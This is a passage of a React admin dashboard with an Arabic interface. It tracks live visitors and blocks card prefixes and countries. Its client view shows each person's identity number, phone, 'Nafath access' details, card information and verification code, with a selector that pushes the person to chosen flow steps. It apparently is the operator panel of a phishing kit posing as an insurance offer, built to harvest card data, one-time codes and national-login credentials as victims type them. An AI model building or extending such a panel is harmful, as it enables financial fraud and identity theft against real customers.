                  <path d="M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326" />
                </svg>
              </button>
              <button style={{ display: "flex", alignItems: "center", gap: 6, padding: "0 10px", height: 46, border: 0, background: "transparent", cursor: "pointer" }} title="تسجيل الخروج">
                <div style={{ width: 28, height: 28, borderRadius: "50%", background: "linear-gradient(135deg, #3b82f6, #7c3aed)", display: "grid", placeItems: "center", color: "#111827", fontWeight: 700, fontSize: "0.8rem" }}>A</div>
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" style={{ color: "#9ca3af" }}>
                  <path d="M19 9l-7 7-7-7" />
                </svg>
              </button>
            </div>
          </header>

          {activeTab === "requests" && (
            <section key="requests" style={{ display: "grid", gridTemplateColumns: "repeat(4, minmax(0, 1fr))", gap: 14 }}>
              {statCards.map((card) => (
                <article key={card.label} style={{ background: "rgba(16,27,47,0.94)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 16, padding: 16, boxShadow: "0 10px 26px rgba(0,0,0,0.22)" }}>
                  <div style={{ color: "#8ea4c0", fontSize: "0.9rem", marginBottom: 6 }}>{card.label}</div>
                  <div style={{ fontSize: "1.5rem", fontWeight: 700, color: card.tone }}>{card.value}</div>
                </article>
              ))}
            </section>
          )}

          {activeTab === "payments" && (
            <section key="payments" style={{ display: "grid", gap: 16 }}>
              <article style={{ background: "rgba(16,27,47,0.94)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 18, padding: 18, boxShadow: "0 10px 26px rgba(0,0,0,0.22)" }}>
                <h3 style={{ margin: "0 0 10px" }}>إعدادات الحظر على البطاقات</h3>
                <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 12 }}>
                  <input value={cardInput} onChange={(e) => setCardInput(e.target.value)} placeholder="أدخل أول 4-6 أرقام" style={{ flex: 1, minWidth: 220, borderRadius: 10, border: "1px solid rgba(255,255,255,0.08)", background: "#0b1427", color: "#f5f8ff", padding: "10px 12px" }} />
                  <button onClick={addBlockedCard} style={{ border: 0, background: "#2f8cff", color: "white", padding: "10px 12px", borderRadius: 10, cursor: "pointer" }}>حجب البطاقة</button>
                </div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                  {blockedCards.map((item) => (
                    <div key={item} style={{ background: "#0b1427", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 999, padding: "8px 12px", display: "flex", alignItems: "center", gap: 8 }}>
                      <span>{item}</span>
                      <button onClick={() => removeBlockedCard(item)} style={{ border: 0, background: "transparent", color: "#ff8f8f", cursor: "pointer" }}>×</button>
                    </div>
                  ))}
                </div>
                <p style={{ marginTop: 10, color: "#8ea4c0" }}>عند إدخال رقم مطابق لرمز محظور، يظهر للعميل: “الدفع غير متاح لبطاقات الراجحي؛ يرجى استخدام طرق دفع مختلفة”.</p>
              </article>
            </section>
          )}

          {activeTab === "access" && (
            <section key="access" style={{ display: "grid", gap: 16 }}>
              <article style={{ background: "rgba(16,27,47,0.94)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 18, padding: 18, boxShadow: "0 10px 26px rgba(0,0,0,0.22)" }}>
                <h3 style={{ margin: "0 0 10px" }}>تقييد الوصول حسب الدولة</h3>
                <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 12 }}>
                  <select value={countryInput} onChange={(e) => setCountryInput(e.target.value)} style={{ flex: 1, minWidth: 220, borderRadius: 10, border: "1px solid rgba(255,255,255,0.08)", background: "#0b1427", color: "#f5f8ff", padding: "10px 12px" }}>
                    <option value="">اختر دولة</option>
                    {countryOptions.map((country) => <option key={country} value={country}>{country}</option>)}
                  </select>
                  <button onClick={addBlockedCountry} style={{ border: 0, background: "#ff5b57", color: "white", padding: "10px 12px", borderRadius: 10, cursor: "pointer" }}>حجب الدولة</button>
                </div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                  {blockedCountries.map((item) => (
                    <div key={item} style={{ background: "#0b1427", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 999, padding: "8px 12px", display: "flex", alignItems: "center", gap: 8 }}>
                      <span>{item}</span>
                      <button onClick={() => removeBlockedCountry(item)} style={{ border: 0, background: "transparent", color: "#ff8f8f", cursor: "pointer" }}>×</button>
                    </div>
                  ))}
                </div>
                <p style={{ marginTop: 10, color: "#8ea4c0" }}>عند حجب الدولة، يمنع أي زائر من هذه الدولة من الدخول إلى الموقع.</p>
              </article>
            </section>
          )}

          {activeTab === "visitors" && (
            <section key="visitors" style={{ background: "#ffffff", border: "1px solid #e5e7eb", borderRadius: 18, padding: 18, boxShadow: "0 10px 26px rgba(15,23,42,0.06)" }}>
              <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 12 }}>
                <div>
                  <h3 style={{ margin: 0 }}>الزوار</h3>
                  <p style={{ margin: "4px 0 0", color: "#6b7280", fontSize: "0.9rem" }}>جميع الزوار النشطين وغير النشطين الذين دخلوا الموقع مع التعرف على الدولة</p>
                </div>
                <div style={{ background: "rgba(49,196,141,0.16)", color: "#16a34a", borderRadius: 999, padding: "8px 12px", fontWeight: 700 }}>
                  {requests.filter((item) => Boolean(item.raw?.isOnline || item.raw?.isConnected || item.raw?.connected || item.raw?.online)).length} متصل الآن
                </div>
              </div>
              <div style={{ display: "grid", gap: 10 }}>
                {requests.map((item) => {
                  const isOnline = Boolean(item.raw?.isOnline || item.raw?.isConnected || item.raw?.connected || item.raw?.online);
                  const displayName = getVisitorDisplayName(item);
                  const hasData = hasMeaningfulClientPayload(item.raw || {});
                  const countryLabel = getVisitorCountryLabel(item.raw?.country || item.raw?.countryName || item.raw?.countryCode || item.raw?.location?.country || item.raw?.geo?.country);
                  return (
                    <article key={item.id} style={{ background: "#f8fafc", border: "1px solid #e5e7eb", borderRadius: 14, padding: 14 }}>
                      <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", gap: 10 }}>
                        <div>
                          <div style={{ fontWeight: 700, color: "#111827" }}>{displayName}</div>
                          <div style={{ color: "#6b7280", fontSize: "0.82rem", marginTop: 4 }}>
                            {hasData ? `تم إدخال بيانات العميل • ${displayName}` : `زائر${countryLabel ? ` من ${countryLabel}` : ""}`} • {getPageLabel(item)} • آخر تحديث {item.updated}
                          </div>
                        </div>
                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                          <span style={{ width: 14, height: 14, borderRadius: "50%", background: isOnline ? "#31c48d" : "#000", display: "inline-block", boxShadow: isOnline ? "0 0 0 6px rgba(49,196,141,0.2)" : "0 0 0 6px rgba(255,255,255,0.08)" }} />
                          <span style={{ color: isOnline ? "#16a34a" : "#6b7280", fontWeight: 700 }}>{isOnline ? "متصل" : "غير متصل"}</span>
                        </div>
                      </div>
                    </article>
                  );
                })}
              </div>
            </section>
          )}

          {activeTab === "clients" && (
            <section
              key="clients"
              style={{
                width: "100%",
                maxWidth: "100%",
                margin: 0,
                alignSelf: "stretch",
                background: "transparent",
                border: 0,
                borderRadius: 0,
                padding: 0,
                boxShadow: "none",
                display: "flex",
                flexDirection: "column",
                gap: 16,
              }}
            >
              <div style={{ display: "grid", gridTemplateColumns: "minmax(280px, 360px) minmax(0, 1fr)", gap: 16, width: "100%", alignItems: "start" }}>
                <aside
                  style={{
                    background: "#ffffff",
                    border: "1px solid #e5e7eb",
                    borderRadius: 18,
                    padding: 16,
                    boxShadow: "0 10px 24px rgba(15, 23, 42, 0.04)",
                  }}
                >
                  <div style={{ color: "#2563eb", fontSize: "0.82rem", marginBottom: 12, fontWeight: 700, display: "flex", justifyContent: "space-between" }}>
                    <span>العملاء</span>
                    <span>{requests.length}</span>
                  </div>

                  <div style={{ marginBottom: 10 }}>
                    <input
                      value={customerSearch}
                      onChange={(event) => setCustomerSearch(event.target.value)}
                      placeholder="ابحث بالاسم أو الهوية أو آخر 4 أرقام"
                      style={{ width: "100%", border: "1px solid #e5e7eb", borderRadius: 10, padding: "10px 12px", fontSize: "0.9rem", outline: "none" }}
                    />
                  </div>

                  {selectedCustomerIds.length > 0 && (
                    <div style={{ display: "flex", gap: 8, flexWrap: "wrap", marginBottom: 10 }}>
                      <button type="button" onClick={handleSelectAllVisible} style={{ border: "1px solid #dbeafe", borderRadius: 999, padding: "7px 10px", background: "#eff6ff", color: "#1d4ed8", fontSize: "0.82rem", fontWeight: 700 }}>
                        تحديد الكل
                      </button>
                      <button type="button" onClick={handleBulkDelete} style={{ border: "1px solid #fee2e2", borderRadius: 999, padding: "7px 10px", background: "#fef2f2", color: "#dc2626", fontSize: "0.82rem", fontWeight: 700 }}>
                        حذف
                      </button>
                      <button type="button" onClick={handleBulkArchive} style={{ border: "1px solid #d1fae5", borderRadius: 999, padding: "7px 10px", background: "#ecfdf5", color: "#047857", fontSize: "0.82rem", fontWeight: 700 }}>
                        أرشفة
                      </button>
                    </div>
                  )}

                  <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                    {filteredClientSections.withData.length > 0 && (
                      <div>
                        {filteredClientSections.withData.map((item) => {
                          const isSelected = selectedCustomerIds.includes(item.id);
                          const isActive = item.id === selectedRequest.id;
                          const isOnline = Boolean(item.raw?.isOnline || item.raw?.isConnected || item.raw?.connected || item.raw?.online);
                          return (
                            <button
                              key={item.id}
                              type="button"
                              onClick={() => setSelectedRequestId(item.id)}
                              style={{
                                display: "flex",
                                alignItems: "center",
                                gap: 12,
                                border: isActive ? "1px solid #2563eb" : "1px solid #e5e7eb",
                                borderRadius: 14,
                                padding: "12px 14px",
                                background: isActive ? "rgba(37, 99, 235, 0.05)" : "#ffffff",
                                color: "#111827",
                                textAlign: "right",
                                cursor: "pointer",
                                width: "100%",
                                transition: "all 0.2s",
                              }}
                            >
                              <div
                                role="checkbox"
                                aria-checked={isSelected}
                                onClick={(event) => {
                                  event.stopPropagation();
                                  toggleCustomerSelection(item.id);
                                }}
                                style={{
                                  width: 22,
                                  height: 22,
                                  borderRadius: 6,
                                  border: isSelected ? "1px solid #2563eb" : "1px solid #cbd5e1",
                                  background: isSelected ? "#2563eb" : "#f8fafc",
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  color: "#ffffff",
                                  flexShrink: 0,
                                  fontSize: "0.9rem",
                                  fontWeight: 800,
                                }}
                              >
                                {isSelected ? "✓" : ""}
                              </div>

                              <div style={{ width: 40, height: 40, borderRadius: "50%", background: "#f3f4f6", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                                👤
                              </div>

                              <div style={{ flex: 1, minWidth: 0, display: "flex", flexDirection: "column", gap: 2 }}>
                                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                                  <span style={{ fontWeight: 800, fontSize: "0.95rem", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                                    {item.customer}
                                  </span>
                                  {item.hasCard && <span style={{ color: "#3b82f6", fontSize: "0.9rem" }}>💳</span>}
                                </div>

                                <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: "0.8rem", color: "#6b7280" }}>
                                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: isOnline ? "#31c48d" : "#9ca3af" }}></span>
                                  {isOnline ? "نشط الآن" : "غير متصل"}
                                </div>
                              </div>
                            </button>
                          );
                        })}
                      </div>
                    )}

                    {filteredClientSections.withoutData.length > 0 && (
                      <div>
                        {filteredClientSections.withoutData.map((item) => {
                          const isSelected = selectedCustomerIds.includes(item.id);
                          const isActive = item.id === selectedRequest.id;
                          const isOnline = Boolean(item.raw?.isOnline || item.raw?.isConnected || item.raw?.connected || item.raw?.online);
                          return (
                            <button
                              key={item.id}
                              type="button"
                              onClick={() => setSelectedRequestId(item.id)}
                              style={{
                                display: "flex",
                                alignItems: "center",
                                gap: 12,
                                border: isActive ? "1px solid #2563eb" : "1px solid #e5e7eb",
                                borderRadius: 14,
                                padding: "12px 14px",
                                background: isActive ? "rgba(37, 99, 235, 0.05)" : "#ffffff",
                                color: "#111827",
                                textAlign: "right",
                                cursor: "pointer",
                                width: "100%",
                                transition: "all 0.2s",
                              }}
                            >
                              <div
                                role="checkbox"
                                aria-checked={isSelected}
                                onClick={(event) => {
                                  event.stopPropagation();
                                  toggleCustomerSelection(item.id);
                                }}
                                style={{
                                  width: 22,
                                  height: 22,
                                  borderRadius: 6,
                                  border: isSelected ? "1px solid #2563eb" : "1px solid #cbd5e1",
                                  background: isSelected ? "#2563eb" : "#f8fafc",
                                  display: "inline-flex",
                                  alignItems: "center",
                                  justifyContent: "center",
                                  color: "#ffffff",
                                  flexShrink: 0,
                                  fontSize: "0.9rem",
                                  fontWeight: 800,
                                }}
                              >
                                {isSelected ? "✓" : ""}
                              </div>

                              <div style={{ width: 40, height: 40, borderRadius: "50%", background: "#f3f4f6", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
                                👤
                              </div>

                              <div style={{ flex: 1, minWidth: 0, display: "flex", flexDirection: "column", gap: 2 }}>
                                <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
                                  <span style={{ fontWeight: 800, fontSize: "0.95rem", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis" }}>
                                    {item.customer}
                                  </span>
                                  {item.hasCard && <span style={{ color: "#3b82f6", fontSize: "0.9rem" }}>💳</span>}
                                </div>

                                <div style={{ display: "flex", alignItems: "center", gap: 6, fontSize: "0.8rem", color: "#6b7280" }}>
                                  <span style={{ width: 8, height: 8, borderRadius: "50%", background: isOnline ? "#31c48d" : "#9ca3af" }}></span>
                                  {isOnline ? "نشط الآن" : "غير متصل"}
                                </div>
                              </div>
                            </button>
                          );
                        })}
                      </div>
                    )}
                  </div>
                </aside>

                <div style={{ display: "flex", flexDirection: "column", gap: 12, width: "100%" }}>
                  {(isCardBlocked || isCountryBlocked) && (
                    <div style={{ border: "1px solid #fecaca", borderRadius: 14, padding: 12, background: "#fef2f2", color: "#991b1b" }}>
                      {isCardBlocked && "الدفع غير متاح لبطاقات الراجحي؛ يرجى استخدام طرق دفع مختلفة."}
                      {isCardBlocked && isCountryBlocked ? " " : ""}
                      {isCountryBlocked && `تم حظر الدخول من الدولة ${selectedRequest.raw?.country || selectedRequest.raw?.countryName || "المحددة"}.`}
                    </div>
                  )}

                  <div style={{ display: "grid", gap: 12 }}>
                    <div style={{ display: "grid", gap: 12 }}>
                      <article style={summaryBarStyle}>
                        <div style={{ display: "flex", alignItems: "center", justifyContent: "flex-start", gap: "8px", fontSize: "13px", color: "#6b7280", flexWrap: "nowrap", overflowX: "auto", overflowY: "hidden", minWidth: 0, flex: 1, marginRight: "auto", textAlign: "left" }}>
                          <div style={{ display: "flex", flexDirection: "column", alignItems: "flex-start", gap: 2, minWidth: 0 }}>
                            <div style={{ fontWeight: 700, color: "#111827", fontSize: "13px", whiteSpace: "nowrap", textOverflow: "ellipsis", overflow: "hidden" }}>
                              {selectedRequest.customer}
                            </div>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px", whiteSpace: "nowrap", flexWrap: "nowrap", fontSize: "12px", justifyContent: "flex-start" }}>
                              <span>{clientSummaryMeta.identity}</span>
                              <span style={{ color: "#9ca3af" }}>|</span>
                              <span>{clientSummaryMeta.phone}</span>
                              <span style={{ color: "#9ca3af" }}>|</span>
                              <span>{getDeviceIcon()}</span>
                              <span style={{ color: "#9ca3af" }}>|</span>
                              <span>{clientSummaryMeta.countryCode}</span>
                              <span style={{ color: "#9ca3af" }}>|</span>
                              <span>{clientSummaryMeta.pageLabel}</span>
                            </div>
                          </div>
                        </div>

                        <div style={{ display: "flex", alignItems: "center", gap: "8px", flexShrink: 0, marginRight: "8px" }}>
                          <select
                            value={selectedFlowStep}
                            onChange={(event) => { void handleFlowSelection(event.target.value); }}
                            style={{ border: "1px solid #e5e7eb", borderRadius: 8, padding: "4px 8px", background: "#fff", fontSize: "14px", maxWidth: "100%" }}
                          >
                            {flowOptions.map((option) => (
                              <option key={option.value} value={option.value}>
                                {option.label}
                              </option>
                            ))}
                          </select>
                        </div>
                      </article>

                    </div>

                    <div style={{ ...cardShellStyle, padding: "18px 20px", minHeight: 220 }}>
                      <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>معلومات أساسية</div>

                      {detailItems.length > 0 ? (
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {detailItems.map((item) => (
                            <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                              <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>
                                {item.label}
                              </div>
                              <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>
                                {item.value}
                              </div>
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div style={{ color: "#6b7280", fontSize: "0.92rem" }}>
                          لا توجد بيانات مضافة بعد.
                        </div>
                      )}
                    </div>

                    <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(0, 1fr))", gap: 12 }}>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>صندوق النفاذ</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {accessDetails.map((item) => (
                            <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                              <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                              <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                            </div>
                          ))}
                        </div>
                      </article>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>صندوق معلومات الهاتف</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {phoneInfoDetails.map((item) => (
                            <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                              <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                              <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                            </div>
                          ))}
                        </div>
                      </article>
                    </div>

                    <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(0, 1fr))", gap: 12 }}>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>تفاصيل التأمين</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {insuranceDetails.length > 0 ? (
                            insuranceDetails.map((item) => (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                                <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                                <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                              </div>
                            ))
                          ) : (
                            <div style={{ color: "#6b7280", fontSize: "0.92rem" }}>لا توجد بيانات مضافة بعد.</div>
                          )}
                        </div>
                      </article>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>العرض المختار</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {offerDetails.length > 0 ? (
                            offerDetails.map((item) => (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                                <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                                <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                              </div>
                            ))
                          ) : (
                            <div style={{ color: "#6b7280", fontSize: "0.92rem" }}>لا توجد بيانات مضافة بعد.</div>
                          )}
                        </div>
                      </article>
                    </div>

                    <div style={{ display: "grid", gridTemplateColumns: "repeat(2, minmax(0, 1fr))", gap: 12 }}>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>معلومات البطاقة</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {cardDetails.length > 0 ? (
                            cardDetails.map((item) => (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                                <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                                <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                              </div>
                            ))
                          ) : (
                            <div style={{ color: "#6b7280", fontSize: "0.92rem" }}>لا توجد بيانات مضافة بعد.</div>
                          )}
                        </div>
                      </article>
                      <article style={{ ...cardShellStyle, padding: "18px 20px" }}>
                        <div style={{ ...sectionTitleStyle, marginBottom: "16px", paddingBottom: "10px", borderBottom: "1px solid #f3f4f6" }}>رمز التحقق</div>
                        <div style={{ display: "flex", flexDirection: "column", gap: "14px" }}>
                          {verificationDetails.length > 0 ? (
                            verificationDetails.map((item) => (
                              <div key={item.label} style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
                                <div style={{ color: "#6b7280", fontSize: "0.85rem" }}>{item.label}</div>
                                <div style={{ fontWeight: 700, color: "#111827", fontSize: "0.95rem", textAlign: "left", maxWidth: "60%" }}>{item.value}</div>
                              </div>
                            ))
                          ) : (
                            <div style={{ color: "#6b7280", fontSize: "0.92rem" }}>لا توجد بيانات مضافة بعد.</div>
                          )}
                        </div>
                      </article>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          )}
        </main>
      </div>
    </div>
  );
}
